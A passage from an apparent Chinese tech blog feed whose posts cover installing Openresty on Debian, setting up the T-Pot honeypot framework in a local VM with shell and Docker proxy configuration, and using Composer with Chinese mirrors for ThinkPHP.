environmen</h4><ul><li>检查Debian环境并通过输入的参数选择安装方式，例如参数 –type=user</li><li>检查是否设定了配置文件，由于我们安装时没有指定 –conf参数，所以这里的检查会直接跳过</li><li>打印出一些信息，调用fuCHECK_PORTS检查已有服务</li></ul><h4 id="Installer-user-interaction-phase"><a href="#Installer-user-interaction-phase" class="headerlink" title="Installer user interaction phase"></a>Installer user interaction phase</h4><ul><li>调用fuCHECKNET 检查网络</li><li>如果是iso的安装方式，会自动加载iso配置并配置代理，其他安装方式不会自动处理代理。</li><li>选择安装模式，STANDARD、SENSOR等</li><li>输入用户名密码</li></ul><h4 id="Installation-phase"><a href="#Installation-phase" class="headerlink" title="Installation phase"></a>Installation phase</h4><ul><li>调用fuGET_DEPS 安装依赖</li><li>对于sensor模式的安装，安装脚本不会自动写入web凭证</li><li>配置网络</li><li>安装elasticdump、elasticsearch-curator</li><li>如果不是iso方式安装，会从github上重新下载tpotce到/opt/tpot</li><li>修改sshd服务端口、重写/opt/hosts配置</li><li>根据交互安装时的选择，将不同的docker-compose文件链接到tpot目录下</li><li>下载docker镜像</li><li>进行定时任务配置</li><li>建立日志文件夹:/data/***</li><li>修改文件夹权限、与ews社区服务建立联系等</li></ul><h3 id="update-sh"><a href="#update-sh" class="headerlink" title="update.sh"></a>update.sh</h3><h2 id="0x02-T-pot架构"><a href="#0x02-T-pot架构" class="headerlink" title="0x02 T-pot架构"></a>0x02 T-pot架构</h2><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/v2-bfd14215d9efcd3b8cac28eb8850cba9_r.jpg" alt="preview"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;T-pot结构分析&quot;&gt;&lt;a href=&quot;#T-pot结构分析&quot; class=&quot;headerlink&quot; title=&quot;T-pot结构分析&quot;&gt;&lt;/a&gt;T-pot结构分析&lt;/h1&gt;&lt;h2 id=&quot;0x01-目录结构&quot;&gt;&lt;a href=&quot;#0x01-目录结构&quot; class</summary>
      
    
    
    
    <category term="蜜罐" scheme="https://greydr34d.github.io/categories/%E8%9C%9C%E7%BD%90/"/>
    
    <category term="T-pot" scheme="https://greydr34d.github.io/categories/%E8%9C%9C%E7%BD%90/T-pot/"/>
    
    
    <category term="T-pot" scheme="https://greydr34d.github.io/tags/T-pot/"/>
    
    <category term="蜜罐" scheme="https://greydr34d.github.io/tags/%E8%9C%9C%E7%BD%90/"/>
    
  </entry>
  
  <entry>
    <title>【转载】Openresty Debian部署</title>
    <link href="https://greydr34d.github.io/2021/02/01/Openresty-Debian%E9%83%A8%E7%BD%B2%E3%80%90%E8%AF%91%E6%96%87%E3%80%91/"/>
    <id>https://greydr34d.github.io/2021/02/01/Openresty-Debian%E9%83%A8%E7%BD%B2%E3%80%90%E8%AF%91%E6%96%87%E3%80%91/</id>
    <published>2021-02-01T13:58:19.000Z</published>
    <updated>2021-03-12T11:22:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【转载】Openresty-Debian部署"><a href="#【转载】Openresty-Debian部署" class="headerlink" title="【转载】Openresty Debian部署"></a>【转载】Openresty Debian部署</h1><p>原文地址：<a href="https://www.installing.in/how-to-install-openresty-on-debian-10/">How to Install Openresty on Debian 10</a></p><p>Openresty是基于Nginx构建的Web服务器，具有一些其他内置功能，例如Lua编程语言。如果要将Lua与Nginx一起使用，则需要从具有Lua支持但带有openresty的源代码编译Nginx，可以获得Nginx的所有功能以及其他一些功能，而无需经历从源代码进行编译的麻烦。</p><p>要在Debian 10上安装Openresty，请遵循以下简单步骤</p><h2 id="步骤1-：（可选）停止Nginx"><a href="#步骤1-：（可选）停止Nginx" class="headerlink" title="步骤1 ：（可选）停止Nginx"></a><strong>步骤1 ：（可选）停止Nginx</strong></h2><p>仅当您已经在系统上运行Nginx时才需要执行此步骤。如果不停止Nginx，openresty的安装可能会失败。</p><p>运行这些命令以停止和禁用Nginx</p><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">disable</span> nginxsudo systemctl stop nginx</code></pre></div><h2 id="步骤2：导入GPG密钥"><a href="#步骤2：导入GPG密钥" class="headerlink" title="步骤2：导入GPG密钥"></a><strong>步骤2：导入GPG密钥</strong></h2><p>运行以下命令以导入GPG密钥</p><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get -y install --no-install-recommends wget gnupg ca-certificates</code></pre></div><p>上面的命令将安装一些依赖项以导入密钥</p><div class="hljs code-wrapper"><pre><code class="hljs bash">wget -O - https://openresty.org/package/pubkey.gpg | sudo apt-key add -</code></pre></div><p>此命令会将GPG密钥导入您的系统</p><h2 id="步骤3：添加Openresty存储库"><a href="#步骤3：添加Openresty存储库" class="headerlink" title="步骤3：添加Openresty存储库"></a><strong>步骤3：添加Openresty存储库</strong></h2><p>首先，获取系统的Debian OS版本。该命令将获取版本代号，并将其保存到变量“代号”。我们将在下一个命令中使用此变量来为您的系统添加适当的存储库。</p><div class="hljs code-wrapper"><pre><code class="hljs bash">codename=`grep -Po <span class="hljs-string">&#x27;VERSION=&quot;[0-9]+ \(\K[^)]+&#x27;</span> /etc/os-release`</code></pre></div><p>现在为您的版本添加openresty存储库</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;deb http://openresty.org/package/debian <span class="hljs-variable">$codename</span> openresty&quot;</span> \ | sudo tee /etc/apt/sources.list.d/openresty.list</code></pre></div><h2 id="步骤4：更新apt索引"><a href="#步骤4：更新apt索引" class="headerlink" title="步骤4：更新apt索引"></a><strong>步骤4：更新apt索引</strong></h2><p>使用此命令更新apt索引，以便我们可以从资源库下载最新的软件包</p><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get update</code></pre></div><h2 id="步骤5：安装Openresty"><a href="#步骤5：安装Openresty" class="headerlink" title="步骤5：安装Openresty"></a><strong>步骤5：安装Openresty</strong></h2><p>现在，使用此命令从资源库下载并安装Openresty软件包</p><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo apt-get -y install openresty</code></pre></div><p>如果一切顺利，您将在系统上安装openresty。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.installing.in/how-to-install-openresty-on-debian-10/">How to Install Openresty on Debian 10</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;【转载】Openresty-Debian部署&quot;&gt;&lt;a href=&quot;#【转载】Openresty-Debian部署&quot; class=&quot;headerlink&quot; title=&quot;【转载】Openresty Debian部署&quot;&gt;&lt;/a&gt;【转载】Openresty Debian</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    <category term="openresty" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/openresty/"/>
    
    
    <category term="openresty" scheme="https://greydr34d.github.io/tags/openresty/"/>
    
    <category term="debian" scheme="https://greydr34d.github.io/tags/debian/"/>
    
  </entry>
  
  <entry>
    <title>T-Pot 20.06.1本地安装与代理使用问题</title>
    <link href="https://greydr34d.github.io/2021/01/23/T-Pot-20-06-1%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BB%A3%E7%90%86%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98/"/>
    <id>https://greydr34d.github.io/2021/01/23/T-Pot-20-06-1%E6%9C%AC%E5%9C%B0%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BB%A3%E7%90%86%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98/</id>
    <published>2021-01-23T07:56:43.000Z</published>
    <updated>2021-01-23T08:37:58.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="T-Pot-本地安装与代理使用问题"><a href="#T-Pot-本地安装与代理使用问题" class="headerlink" title="T-Pot 本地安装与代理使用问题"></a>T-Pot 本地安装与代理使用问题</h1><p>第一次使用T-pot，由于笔者没有6G内存的vps，所以只能在虚拟机里尝试安装。国内网络无法流畅的访问国外源，代理是必要的。本文解决的问题是T-pot安装过程中docker 下载过慢的问题。希望对像我一样的初次使用者有所帮助。</p><h2 id="T-pot简介"><a href="#T-pot简介" class="headerlink" title="T-pot简介"></a>T-pot简介</h2><p>T-Pot是一个多蜜罐框架，该框架部署了一系列Docker容器，可模拟常见的可利用服务。T-Pot从每个容器收集所有日志，然后集中到ELK中，从而方便管理员查看针对每种服务的攻击行为。</p><h2 id="T-pot安装"><a href="#T-pot安装" class="headerlink" title="T-pot安装"></a>T-pot安装</h2><p>T-pot有2种安装方式：</p><ol><li>使用预先建立的ISO映像：可以使用官方提供的<a href="https://github.com/telekom-security/tpotce/releases">iso</a>也可以自行修改后<a href="https://github.com/telekom-security/tpotce#create-your-own-iso-image">编译</a>，得到iso后可以在vmware中安装。</li><li>云部署：云服务无法选择自己编译的iso，这时候可以指定在云上部署debian10，然后下载源码运行install.sh安装</li></ol><p>我在本地虚拟机上使用第二种安装方式：</p><p>首先需要准备一个debian镜像，可以到此处下载</p><p>Debian镜像（清华大学）下载源：<a href="https://mirrors.tuna.tsinghua.edu.cn/debian-cd/10.7.0-live/amd64/iso-hybrid/debian-live-10.7.0-amd64-standard.iso">debian-live-10.7.0-amd64-standard.iso</a></p><p>我使用的是  debian-live-10.7.0-amd64-standard.iso</p><p>具体的debian安装可以参考<a href="https://zhuanlan.zhihu.com/p/73122221">图解 Debian 10（Buster）安装步骤</a>，与这篇文章不同的是，由于我之后的安装过程都会通过代理来完成，所以我选择的源为debian官方源。</p><p><strong>注意：</strong>新建用户的用户名不要是tpot，因为tpot服务会自动创建tpot用户。</p><h3 id="切换到root"><a href="#切换到root" class="headerlink" title="切换到root"></a>切换到root</h3><p>debian下切换到root与ubuntu不同</p><div class="hljs code-wrapper"><pre><code class="hljs bash">su -</code></pre></div><h3 id="shell配置代理"><a href="#shell配置代理" class="headerlink" title="shell配置代理"></a>shell配置代理</h3><p>我比较习惯使用如下方式进行代理配置：输入proxy即可打开代理连接，noproxy即可关闭。</p><p>在~/.bashrc中写入：</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-function"><span class="hljs-title">proxy</span></span> () &#123;  <span class="hljs-built_in">export</span> http_proxy=<span class="hljs-string">&quot;http://192.168.133.1:10809&quot;</span>  <span class="hljs-built_in">export</span> https_proxy=<span class="hljs-string">&quot;http://192.168.133.1:10809&quot;</span>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;HTTP Proxy on&quot;</span>&#125;<span class="hljs-comment"># where noproxy</span><span class="hljs-function"><span class="hljs-title">noproxy</span></span> () &#123;  <span class="hljs-built_in">unset</span> http_proxy  <span class="hljs-built_in">unset</span> https_proxy  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;HTTP Proxy off&quot;</span>&#125;</code></pre></div><p>生效</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ~/.bashrc</code></pre></div><h3 id="安装net-tools"><a href="#安装net-tools" class="headerlink" title="安装net-tools"></a>安装net-tools</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">apt install net-tools</code></pre></div><h3 id="安装sshd"><a href="#安装sshd" class="headerlink" title="安装sshd"></a>安装sshd</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">apt install openssh-server</code></pre></div><p>安装好后我就可以使用vscode直接连接到这台虚拟机，shell里的复制粘贴方便多了。</p><h3 id="安装docker-io"><a href="#安装docker-io" class="headerlink" title="安装docker.io"></a>安装docker.io</h3><p>为什么要提前安装docker，主要是为了解决安装脚本运行过程中docker镜像拉取过慢的问题。尽管安装脚本install.sh中有配置代理的代码，但是并不会在我们这种方式中自动弹出配置，一种方法是直接修改install.sh，使得在安装docker后自动进行代理配置，另一种方法是提前安装docker并做好配置，不修改源码。这里选择后者。</p><div class="hljs code-wrapper"><pre><code class="hljs bash">apt install docker.io</code></pre></div><p>为什么shell中配置的代理对docker无效，具体可参考：<a href="https://cloud.tencent.com/developer/article/1627708">Linux 系统代理魔法对 Docker 无效？</a></p><blockquote><p><code>Linux</code>所谓的系统代理是针对系统使用者，通过<code>SHELL</code>转化用户请求为系统可识别，完成网络出口的系统转发。<code>Docker</code>基于<code>C/S</code>架构运行，<code>Server</code>端由<code>Systemd</code>维护管理，<code>Client</code>非<code>daemon</code>方式运行，所有请求以<code>API</code>方式，通过<code>SHELL</code>环境，转由<code>Server</code>接收执行命令并返回结果给<code>Client</code>。因此，系统代理魔法对 <code>Docker</code> 无效。换句话讲，凡由非<code>SHELL</code>运行的服务，环境变量均无效。需在进程本身配置代码或其父进程<code>systemd</code>或<code>sysv</code>配置生效。</p></blockquote><p>如果不挂代理，就会出现如下情况</p><div class="hljs code-wrapper"><pre><code class="hljs bash">docker pull hello-worlddocker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled <span class="hljs-keyword">while</span> waiting <span class="hljs-keyword">for</span> connection (Client.Timeout exceeded <span class="hljs-keyword">while</span> awaiting headers).</code></pre></div><h4 id="修改代理"><a href="#修改代理" class="headerlink" title="修改代理"></a>修改代理</h4><p>先修改 <code>/etc/docker/daemon.json</code>，如果没有就创建</p><div class="hljs code-wrapper"><pre><code class="hljs javascript">&#123;  <span class="hljs-string">&quot;registry-mirrors&quot;</span>:[<span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>]&#125;</code></pre></div><p>再创建<code>/etc/systemd/system/docker.service.d/http-proxy.conf</code>写入如下内容，这一步是给docker加代理</p><div class="hljs code-wrapper"><pre><code class="hljs bash">[Service]Environment=http_proxy=http://proxyip:proxyport</code></pre></div><p>运行</p><div class="hljs code-wrapper"><pre><code class="hljs bash">systemctl daemon-reloadsystemctl restart docker</code></pre></div><h3 id="开始安装T-pot"><a href="#开始安装T-pot" class="headerlink" title="开始安装T-pot"></a>开始安装T-pot</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/telekom-security/tpotce.git<span class="hljs-built_in">cd</span> tpotce/iso/installer/./install.sh --<span class="hljs-built_in">type</span>=user</code></pre></div><p>按照正常的流程走即可</p><p>安装过程中可以会出现一些报错信息，如</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210122164921914.png" alt="image-20210122164921914"></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210123092336899.png" alt="image-20210123092336899"></p><p>不用管即可，安装完成之后会自动重启。</p><p>重启后可能出现</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210123163725531.png" alt="image-20210123163725531"></p><p>这应该是正常现象，一小段时间后系统就正常启动了</p><p>重启之后运行</p><div class="hljs code-wrapper"><pre><code class="hljs bash">systemctl start tpot</code></pre></div><p>T-pot中Kinana的访问使用nginx进行了转发。所以我们得访问nginx监听的64297端口。使用https访问并输入安装时设置的用户名密码就可以进入T-pot页面。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210123154925156.png" alt="image-20210123154925156"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://cyber-99.co.uk/t-pot-honeypot-framework-installation">T-Pot Honeypot Framework Installation</a></li><li><a href="https://www.freebuf.com/geek/260342.html">T-POT蜜罐(20.06)在VPS上安装与使用教程(原创)</a></li><li><a href="https://blog.csdn.net/KoalaZB/article/details/109337255">企业部署T-Pot(20.06)蜜罐系统并使用</a></li><li><a href="https://zhuanlan.zhihu.com/p/73122221">图解 Debian 10（Buster）安装步骤</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;T-Pot-本地安装与代理使用问题&quot;&gt;&lt;a href=&quot;#T-Pot-本地安装与代理使用问题&quot; class=&quot;headerlink&quot; title=&quot;T-Pot 本地安装与代理使用问题&quot;&gt;&lt;/a&gt;T-Pot 本地安装与代理使用问题&lt;/h1&gt;&lt;p&gt;第一次使用T-pot</summary>
      
    
    
    
    <category term="环境搭建" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
    <category term="honeypot" scheme="https://greydr34d.github.io/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/honeypot/"/>
    
    
    <category term="T-pot" scheme="https://greydr34d.github.io/tags/T-pot/"/>
    
    <category term="代理" scheme="https://greydr34d.github.io/tags/%E4%BB%A3%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Composer 快速搭建thinkphp环境</title>
    <link href="https://greydr34d.github.io/2021/01/08/Composer-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAthinkphp%E7%8E%AF%E5%A2%83/"/>
    <id>https://greydr34d.github.io/2021/01/08/Composer-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAthinkphp%E7%8E%AF%E5%A2%83/</id>
    <published>2021-01-08T02:10:11.000Z</published>
    <updated>2021-01-08T02:13:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Composer-快速搭建thinkphp环境"><a href="#Composer-快速搭建thinkphp环境" class="headerlink" title="Composer 快速搭建thinkphp环境"></a>Composer 快速搭建thinkphp环境</h1><p>具体的操作流程可以参考：<a href="http://www.thinkphp.cn/topic/52362.html">史上最详细的Composer安装tp5教程</a></p><h2 id="Composer简介"><a href="#Composer简介" class="headerlink" title="Composer简介"></a>Composer简介</h2><blockquote><p>Composer 不是一个包管理器。是的，它涉及 “packages” 和 “libraries”，但它在每个项目的基础上进行管理，在你项目的某个目录中（例如 <code>vendor</code>）进行安装。默认情况下它不会在全局安装任何东西。因此，这仅仅是一个依赖管理。</p><p>这种想法并不新鲜，Composer 受到了 node’s <a href="http://npmjs.org/">npm</a> 和 ruby’s <a href="http://gembundler.com/">bundler</a> 的强烈启发。而当时 PHP 下并没有类似的工具。</p><p>Composer 将这样为你解决问题：</p><p>a) 你有一个项目依赖于若干个库。</p><p>b) 其中一些库依赖于其他库。</p><p>c) 你声明你所依赖的东西。</p><p>d) Composer 会找出哪个版本的包需要安装，并安装它们（将它们下载到你的项目中）。</p></blockquote><p>你所需要做的就是创建一个 <code>composer.json</code> 文件，其中描述了项目的依赖关系。</p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;    <span class="hljs-attr">&quot;require&quot;</span>: &#123;        <span class="hljs-attr">&quot;monolog/monolog&quot;</span>: <span class="hljs-string">&quot;1.2.*&quot;</span>    &#125;&#125;</code></pre></div><h2 id="Composer安装"><a href="#Composer安装" class="headerlink" title="Composer安装"></a>Composer安装</h2><p>参考Composer中文网的<a href="https://docs.phpcomposer.com/00-intro.html">中文文档</a></p><h2 id="Composer配置中国镜像"><a href="#Composer配置中国镜像" class="headerlink" title="Composer配置中国镜像"></a>Composer配置中国镜像</h2><blockquote><p>有两种方式启用本镜像服务：</p><ul><li><strong>系统全局配置：</strong> 即将配置信息添加到 Composer 的全局配置文件 <code>config.json</code> 中。见<a href="https://pkg.phpcomposer.com/#tip1">“方法一”</a></li><li><strong>单个项目配置：</strong> 将配置信息添加到某个项目的 <code>composer.json</code> 文件中。见<a href="https://pkg.phpcomposer.com/#tip2">“方法二”</a></li></ul><h3 id="方法一：-修改-composer-的全局配置文件（推荐方式）"><a href="#方法一：-修改-composer-的全局配置文件（推荐方式）" class="headerlink" title="方法一： 修改 composer 的全局配置文件（推荐方式）"></a><strong>方法一：</strong> 修改 composer 的全局配置文件<strong>（推荐方式）</strong></h3><p>打开命令行窗口（windows用户）或控制台（Linux、Mac 用户）并执行如下命令：</p><p>复制</p><div class="hljs code-wrapper"><pre><code class="hljs bash">composer config -g repo.packagist composer https://packagist.phpcomposer.com</code></pre></div><h3 id="方法二：-修改当前项目的-composer-json-配置文件："><a href="#方法二：-修改当前项目的-composer-json-配置文件：" class="headerlink" title="方法二： 修改当前项目的 composer.json 配置文件："></a><strong>方法二：</strong> 修改当前项目的 <code>composer.json</code> 配置文件：</h3><p>打开命令行窗口（windows用户）或控制台（Linux、Mac 用户），进入你的项目的根目录（也就是 <code>composer.json</code> 文件所在目录），执行如下命令：</p><p>复制</p><div class="hljs code-wrapper"><pre><code class="hljs bash">composer config repo.packagist composer https://packagist.phpcomposer.com</code></pre></div><p>上述命令将会在当前项目中的 <code>composer.json</code> 文件的末尾自动添加镜像的配置信息（你也可以自己手工添加）：</p><p>复制</p><div class="hljs code-wrapper"><pre><code class="hljs json">&quot;repositories&quot;: &#123;    &quot;packagist&quot;: &#123;        &quot;type&quot;: &quot;composer&quot;,        &quot;url&quot;: &quot;https://packagist.phpcomposer.com&quot;    &#125;&#125;</code></pre></div></blockquote><h2 id="Composer使用"><a href="#Composer使用" class="headerlink" title="Composer使用"></a>Composer使用</h2><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p>转载于：<a href="https://docs.phpcomposer.com/03-cli.html">https://docs.phpcomposer.com/03-cli.html</a></p><div class="hljs code-wrapper"><pre><code class="hljs sh">   ______  / ____/___  ____ ___  ____  ____  ________  _____ / /   / __ \/ __ `__ \/ __ \/ __ \/ ___/ _ \/ ___// /___/ /_/ / / / / / / /_/ / /_/ (__  )  __/ /\____/\____/_/ /_/ /_/ .___/\____/____/\___/_/                    /_/Composer version 1.9.0 2019-08-02 20:55:32Usage:  <span class="hljs-built_in">command</span> [options] [arguments]Options:  -h, --<span class="hljs-built_in">help</span>                     Display this <span class="hljs-built_in">help</span> message  -q, --quiet                    Do not output any message  -V, --version                  Display this application version      --ansi                     Force ANSI output      --no-ansi                  Disable ANSI output  -n, --no-interaction           Do not ask any interactive question      --profile                  Display timing and memory usage information      --no-plugins               Whether to <span class="hljs-built_in">disable</span> plugins.  -d, --working-dir=WORKING-DIR  If specified, use the given directory as working directory.      --no-cache                 Prevent use of the cache  -v|vv|vvv, --verbose           Increase the verbosity of messages: 1 <span class="hljs-keyword">for</span> normal output, 2 <span class="hljs-keyword">for</span> more verbose output and 3 <span class="hljs-keyword">for</span> debugAvailable commands:  about                Shows the short information about Composer.  archive              Creates an archive of this composer package.  browse               Opens the package<span class="hljs-string">&#x27;s repository URL or homepage in your browser.</span><span class="hljs-string">  check-platform-reqs  Check that platform requirements are satisfied.</span><span class="hljs-string">  clear-cache          Clears composer&#x27;</span>s internal package cache.  clearcache           Clears composer<span class="hljs-string">&#x27;s internal package cache.</span><span class="hljs-string">  config               Sets config options.</span><span class="hljs-string">  create-project       Creates new project from a package into given directory.</span><span class="hljs-string">  depends              Shows which packages cause the given package to be installed.</span><span class="hljs-string">  diagnose             Diagnoses the system to identify common errors.</span><span class="hljs-string">  dump-autoload        Dumps the autoloader.</span><span class="hljs-string">  dumpautoload         Dumps the autoloader.</span><span class="hljs-string">  exec                 Executes a vendored binary/script.</span><span class="hljs-string">  global               Allows running commands in the global composer dir ($COMPOSER_HOME).</span><span class="hljs-string">  help                 Displays help for a command</span><span class="hljs-string">  home                 Opens the package&#x27;</span>s repository URL or homepage <span class="hljs-keyword">in</span> your browser.  i                    Installs the project dependencies from the composer.lock file <span class="hljs-keyword">if</span> present, or falls back on the composer.json.  info                 Shows information about packages.  init                 Creates a basic composer.json file <span class="hljs-keyword">in</span> current directory.  install              Installs the project dependencies from the composer.lock file <span class="hljs-keyword">if</span> present, or falls back on the composer.json.  licenses             Shows information about licenses of dependencies.  list                 Lists commands  outdated             Shows a list of installed packages that have updates available, including their latest version.  prohibits            Shows <span class="hljs-built_in">which</span> packages prevent the given package from being installed.  remove               Removes a package from the require or require-dev.  require              Adds required packages to your composer.json and installs them.  run                  Runs the scripts defined <span class="hljs-keyword">in</span> composer.json.  run-script           Runs the scripts defined <span class="hljs-keyword">in</span> composer.json.  search               Searches <span class="hljs-keyword">for</span> packages.  self-update          Updates composer.phar to the latest version.  selfupdate           Updates composer.phar to the latest version.  show                 Shows information about packages.  status               Shows a list of locally modified packages, <span class="hljs-keyword">for</span> packages installed from <span class="hljs-built_in">source</span>.  suggests             Shows package suggestions.  u                    Upgrades your dependencies to the latest version according to composer.json, and updates the composer.lock file.  update               Upgrades your dependencies to the latest version according to composer.json, and updates the composer.lock file.  upgrade              Upgrades your dependencies to the latest version according to composer.json, and updates the composer.lock file.  validate             Validates a composer.json and composer.lock.  why                  Shows <span class="hljs-built_in">which</span> packages cause the given package to be installed.  why-not              Shows <span class="hljs-built_in">which</span> packages prevent the given package from being installed.</code></pre></div><h4 id="搜索-search"><a href="#搜索-search" class="headerlink" title="搜索 search"></a>搜索 <code>search</code></h4><p><code>search</code> 命令允许你为当前项目搜索依赖包，通常它只搜索 packagist.org 上的包，你可以简单的输入你的搜索条件。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar search monolog</code></pre></div><p>您也可以通过传递多个参数来进行多条件搜索。</p><h4 id="搜索-参数"><a href="#搜索-参数" class="headerlink" title="搜索-参数"></a>搜索-参数</h4><ul><li><strong>–only-name (-N):</strong> 仅针对指定的名称搜索（完全匹配）。</li></ul><h4 id="展示-show"><a href="#展示-show" class="headerlink" title="展示 show"></a>展示 <code>show</code></h4><p>列出所有可用的软件包，你可以使用 <code>show</code> 命令。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar show</code></pre></div><p>如果你想看到一个包的详细信息，你可以输入一个包名称。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar show monolog/monologname     : monolog/monologversions : master-dev, 1.0.2, 1.0.1, 1.0.0, 1.0.0-RC1<span class="hljs-built_in">type</span>     : librarynames    : monolog/monolog<span class="hljs-built_in">source</span>   : [git] http://github.com/Seldaek/monolog.git 3d4e60d0cbc4b888fe5ad223d77964428b1978dadist     : [zip] http://github.com/Seldaek/monolog/zipball/3d4e60d0cbc4b888fe5ad223d77964428b1978da 3d4e60d0cbc4b888fe5ad223d77964428b1978dalicense  : MIT<span class="hljs-built_in">autoload</span>psr-0Monolog : src/requiresphp &gt;=5.3.0</code></pre></div><p>你甚至可以输入一个软件包的版本号，来显示该版本的详细信息。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar show monolog/monolog 1.0.2</code></pre></div><h4 id="展示-参数"><a href="#展示-参数" class="headerlink" title="展示-参数"></a>展示-参数</h4><ul><li><strong>–installed (-i):</strong> 列出已安装的依赖包。</li><li><strong>–platform (-p):</strong> 仅列出平台软件包（PHP 与它的扩展）。</li><li><strong>–self (-s):</strong> 仅列出当前项目信息。</li></ul><h4 id="初始化-init"><a href="#初始化-init" class="headerlink" title="初始化 init"></a>初始化 <code>init</code></h4><p>在 <a href="https://docs.phpcomposer.com/02-libraries.html">“库”</a> 那一章我们看到了如何手动创建 <code>composer.json</code> 文件。实际上还有一个 <code>init</code> 命令可以更容易的做到这一点。</p><p>当您运行该命令，它会以交互方式要求您填写一些信息，同时聪明的使用一些默认值。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar init</code></pre></div><p>不过通过这样的方式交互式填写会比较繁琐。</p><h4 id="初始化-参数"><a href="#初始化-参数" class="headerlink" title="初始化-参数"></a>初始化-参数</h4><ul><li><strong>–name:</strong> 包的名称。</li><li><strong>–description:</strong> 包的描述。</li><li><strong>–author:</strong> 包的作者。</li><li><strong>–homepage:</strong> 包的主页。</li><li><strong>–require:</strong> 需要依赖的其它包，必须要有一个版本约束。并且应该遵循 <code>foo/bar:1.0.0</code> 这样的格式。</li><li><strong>–require-dev:</strong> 开发版的依赖包，内容格式与 <strong>–require</strong> 相同。</li><li><strong>–stability (-s):</strong> <code>minimum-stability</code> 字段的值。</li></ul><h4 id="更新-update"><a href="#更新-update" class="headerlink" title="更新 update"></a>更新 <code>update</code></h4><p>为了获取依赖的最新版本，并且升级 <code>composer.lock</code> 文件，你应该使用 <code>update</code> 命令。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar update</code></pre></div><p>这将解决项目的所有依赖，并将确切的版本号写入 <code>composer.lock</code>。</p><p>如果你只是想更新几个包，你可以像这样分别列出它们：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar update vendor/package vendor/package2</code></pre></div><p>你还可以使用通配符进行批量更新：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar update vendor/*</code></pre></div><h4 id="更新-参数"><a href="#更新-参数" class="headerlink" title="更新-参数"></a>更新-参数</h4><ul><li><strong>–prefer-source:</strong> 当有可用的包时，从 <code>source</code> 安装。</li><li><strong>–prefer-dist:</strong> 当有可用的包时，从 <code>dist</code> 安装。</li><li><strong>–dry-run:</strong> 模拟命令，并没有做实际的操作。</li><li><strong>–dev:</strong> 安装 <code>require-dev</code> 字段中列出的包（这是一个默认值）。</li><li><strong>–no-dev:</strong> 跳过 <code>require-dev</code> 字段中列出的包。</li><li><strong>–no-scripts:</strong> 跳过 <code>composer.json</code> 文件中定义的脚本。</li><li><strong>–no-plugins:</strong> 关闭 plugins。</li><li><strong>–no-progress:</strong> 移除进度信息，这可以避免一些不处理换行的终端或脚本出现混乱的显示。</li><li><strong>–optimize-autoloader (-o):</strong> 转换 PSR-0/4 autoloading 到 classmap 可以获得更快的加载支持。特别是在生产环境下建议这么做，但由于运行需要一些时间，因此并没有作为默认值。</li><li><strong>–lock:</strong> 仅更新 lock 文件的 hash，取消有关 lock 文件过时的警告。</li><li><strong>–with-dependencies</strong> 同时更新白名单内包的依赖关系，这将进行递归更新。</li></ul><h4 id="自我更新-self-update"><a href="#自我更新-self-update" class="headerlink" title="自我更新 self-update"></a>自我更新 <code>self-update</code></h4><p>将 Composer 自身升级到最新版本，只需要运行 <code>self-update</code> 命令。它将替换你的 <code>composer.phar</code> 